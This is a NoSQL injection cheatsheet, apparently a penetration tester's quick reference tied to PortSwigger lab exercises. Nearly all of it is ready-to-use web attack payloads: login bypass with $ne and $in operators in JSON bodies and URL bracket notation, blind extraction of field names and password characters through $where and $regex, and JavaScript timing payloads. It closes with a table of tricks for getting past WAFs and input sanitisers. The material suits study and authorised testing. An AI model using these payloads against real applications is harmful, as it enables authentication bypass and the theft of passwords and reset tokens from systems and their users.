# NoSQL Injection — Cheatsheet

Fast-reference only. Every payload here is explained in full, with mechanism, in `02_Exploitation_Techniques.md` and `03_Filter_and_WAF_Bypass.md`. Use this file to jog memory during live engagements, not to learn the techniques for the first time.

---

## 1. Decision Tree — Where to Start

```
Is the input reflected into a JSON body or bracket-notation query string?
├── YES → Test operator injection first (§3 below) — most common, highest real-world hit rate
└── NO (plain string param, e.g. ?category=fizzy) → Test syntax injection first (§2 below)

Does the response change between obviously-true and obviously-false conditions?
├── YES → Boolean-based extraction (§4/§5)
└── NO  → Try $where/JS error differences, then fall back to timing-based (§6)

Is $where / JS evaluation blocked or disabled?
├── YES → Use $regex-based extraction (§5.2) — no JS required
└── NO  → $where + Object.keys() gives fastest field + data enumeration (§5.1)

Are $ keys being stripped or requests rejected outright?
└── Go to 03_Filter_and_WAF_Bypass.md
```

---

## 2. Syntax Injection — Detection & Extraction Quick Reference

| Goal | Payload | Mechanism (one line) |
|---|---|---|
| Multi-context fuzz | `'"\`{ ;$Foo} $Foo \xYZ` | Hits every common string/JS escape context at once |
| Isolate breaking char | `'` | Single quote breaks `this.category == '''` |
| Confirm escaping works | `\'` | Properly escaped quote should NOT break the query |
| Confirm boolean control (false) | `' && 0 && 'x` | Forces query false regardless of original value |
| Confirm boolean control (true) | `' && 1 && 'x` | Leaves original query logic intact |
| Always-true override | `'||'1'=='1` | Makes the whole condition true → returns all rows/docs |
| Null byte truncation | `'%00` | Truncates trailing conditions appended after user input |
| Extract char by position | `admin' && this.password[0]=='a' || 'a'=='b` | Index into field string; brute-force char at position |
| Narrow charset first | `admin' && this.password.match(/\d/) || 'a'=='b` | Regex test — "does it contain a digit" before brute force |
| Confirm field exists | `admin' && this.password!='` | Compare response pattern vs known-good and known-bad field names |

---

## 3. Operator Injection — Auth Bypass Quick Reference

| Goal | Payload (JSON body) | Mechanism (one line) |
|---|---|---|
| Bypass login (any user) | `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` | Matches any doc where both fields ≠ a junk literal → logs in as first match |
| Bypass login (target user) | `{"username":"administrator","password":{"$ne":"invalid"}}` | Fixes username, skips real password check |
| Guess among candidates | `{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}` | Matches any of several candidate usernames in one request |
| URL/bracket-notation equivalent | `?username[$ne]=invalid&password[$ne]=invalid` | Many frameworks auto-expand bracket syntax into the same nested object — works without touching Content-Type |
| Field-existence test | `{"field":{"$exists":true}}` | True if the field is present on the document at all |
| Range-style always-true | `{"field":{"$gt":""}}` | "Greater than empty string" — true for virtually any non-empty value |

---

## 4. Blind Field & Data Enumeration (Operator + JS)

| Step | Payload | Mechanism (one line) |
|---|---|---|
| Confirm `$where` is evaluated | `"$where":"0"` then `"$where":"1"` | 0 forces false, 1 forces true — compare responses |
| Enumerate field name char-by-char | `"$where":"Object.keys(this)[1].match('^.{0}a.*')"` | Index into field-name array; regex-test char at position |
| Intruder double-marker version | `"$where":"Object.keys(this)[§§].match('^.{§§}§§.*')"` | First marker = field index OR position; combine for full sweep |
| Extract discovered field's value | `"$where":"this.resetToken.match('^.{0}a.*')"` | Same char-by-char regex match, now against a value not a key |

---

## 5. Data Extraction Without Errors (Blind) — Two Independent Routes

### 5.1 With JS evaluation enabled (`$where`)
```
admin' && this.password[0]=='a' || 'a'=='b      (syntax-injection context)
"$where":"this.password[0]=='a'"                 (operator-injection context)
```

### 5.2 Without JS evaluation (pure `$regex` — works even when `$where` is disabled)
```json
{"username":"admin","password":{"$regex":"^a.*"}}
```
Mechanism: anchors to start of string, tests first char, extend prefix (`^ab.*`, `^abc.*`...) once confirmed. **Always try this when `$where` is blocked or disabled** — `$regex` is a core operator, rarely turned off.

---

## 6. Timing-Based Blind (Last Resort — No Content/Length Signal At All)

```
admin'+function(x){var w=new Date(new Date().getTime()+5000);while((x.password[0]==="a")&&w>new Date()){};}(this)+'
```
Mechanism: busy-waits 5s only if the condition is true; short-circuits instantly if false. Measure response time, not content.

Simpler equivalent (if `sleep()` is available):
```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

**Always baseline timing first** (several normal requests) before trusting a timing signal — network jitter produces false positives on a single sample.

---

## 7. MongoDB Operator Quick Reference

| Operator | Meaning | Typical offensive use |
|---|---|---|
| `$ne` | not equal | Auth bypass — match anything except a junk literal |
| `$eq` | equal | Usually safe by itself; dangerous only if attacker controls the *comparison value's type* |
| `$gt` / `$gte` | greater than / or equal | Range-based always-true bypass; numeric blind extraction |
| `$lt` / `$lte` | less than / or equal | Same as above, opposite direction |
| `$in` | value is one of array | Multi-candidate username guessing in a single request |
| `$nin` | value is none of array | Alternative bypass shape when `$ne`/`$in` are filtered |
| `$exists` | field is present | Field-existence probing; allowlist-bypass fallback |
| `$regex` | matches pattern | Blind character-by-character extraction without JS |
| `$where` | JS expression evaluates truthy | Full JS injection — field enumeration, char extraction, timing attacks, DoS |
| `$or` / `$and` | logical combination | Smuggling operators past shallow recursive sanitizers |
| `$expr` | evaluate aggregation expression in query context | Advanced operator-based logic injection, similar spirit to `$where` but via the aggregation pipeline |

---

## 8. Filter Bypass Quick Reference

| Blocked thing | Try |
|---|---|
| `$`-prefixed keys stripped from JSON body | Same payload via URL bracket notation (`field[$ne]=x`) — often a different code path entirely |
| Sanitizer only on `req.body` | Test `req.query`, `req.params`, headers, multipart fields |
| `$ne`/`$regex` specifically blocklisted | Try `$gt`, `$exists`, `$nin`, `$where`/`mapReduce()` JS alternatives |
| Naive regex WAF on raw body | Extra whitespace inside JSON, Unicode-escaped keys (`\u0024ne`), key reordering |
| Type enforcement on main login fields | Test secondary endpoints: search, sort, pagination, password-reset, admin/internal APIs, older API versions |
| `$where` disabled server-side | `$regex` blind extraction (§5.2) — doesn't need JS at all |
| Security check appended after user input | Null-byte truncation (`'%00`) to cut off the trailing condition |

---

## 9. PortSwigger Lab Order (Do In This Sequence)

1. **Detecting NoSQL injection** (Apprentice) — syntax injection, fuzz string + boolean confirmation
2. **Exploiting NoSQL operator injection to bypass authentication** (Apprentice) — `$ne`/`$in` login bypass
3. **Exploiting NoSQL injection to extract data** (Practitioner) — syntax/JS character-by-character extraction
4. **Exploiting NoSQL operator injection to extract unknown fields** (Practitioner) — `$where` + `Object.keys()` blind field enumeration

---

## 10. One-Line Reminders

- SQLi breaks **syntax**; operator-based NoSQLi breaks **type assumptions** — no string-escaping needed.
- Test bracket-notation URL params even when JSON-body injection is blocked — different parsing path, different sanitizer coverage.
- `$regex` blind extraction survives `$where` being disabled; always have it as your fallback.
- A WAF/sanitizer that blocks 5 operators didn't block the 6th — operator sweep beats giving up after one blocked attempt.
- Manually reproduce and explain the mechanism behind every automated tool finding (NoSQLMap, nosqli, mongomap) before reporting it — automated NoSQL detection has a real, documented false-positive/negative problem.
